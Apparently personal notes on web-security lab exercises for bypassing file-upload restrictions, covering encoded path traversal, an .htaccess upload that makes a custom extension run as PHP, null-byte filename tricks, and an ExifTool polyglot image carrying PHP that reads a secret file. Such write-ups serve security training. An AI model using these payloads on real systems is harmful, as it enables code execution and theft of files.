**

- Intercept POST /my-account/avatar
    

and change the filename=../image.php

for path traversal, but this gets blocked so the slash must be URL-encoded to  filename=..%2fimage.php

Then access the secret in GET /files/image.php

- Send a POST /my-account/avatar request with the filename set as filename=".htaccess" and Content-Type: text/plain and the body as AddType application/x-httpd-php .food (a custom extension type, can be anything)  
    This maps an arbitrary extension (.food) to the executable MIME type application/x-httpd-php. As the server uses the mod_php module, it knows how to handle this already. 
    

Upload the php file but rename it as image.foodin the filename parameter

View the image to obtain the secret

- Add semicolons or URL-encoded null byte characters before the file extension e.g.: image.php%00.jpg - then this is uploaded as image.php (although the filename value is kept as the exact string, the actual file that is uploaded is image.php) Access  image.php to get the secret
    
- Create an image using ExifTool  
    exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" image.jpg -o polyglot.php
    

Submit and view image and look for START and END markers

**